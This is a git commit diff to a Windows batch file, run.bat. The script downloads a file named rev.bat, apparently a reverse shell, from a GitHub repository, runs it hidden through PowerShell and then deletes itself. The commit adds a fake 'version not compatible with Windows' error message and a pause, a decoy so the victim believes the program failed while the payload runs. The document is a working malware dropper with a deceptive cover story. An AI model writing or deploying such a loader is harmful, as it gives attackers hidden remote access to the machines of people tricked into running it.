3febefbc9c8373b853c276d6cc07e100e3e1d413
Omar Samy <osamy7592@gmail.com>
2024-05-07 18:47:04 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,6 @@
 @echo off
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%temp%\rev.bat"
 powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
+echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
+timeout /t 3 >nul
 del "%~f0"
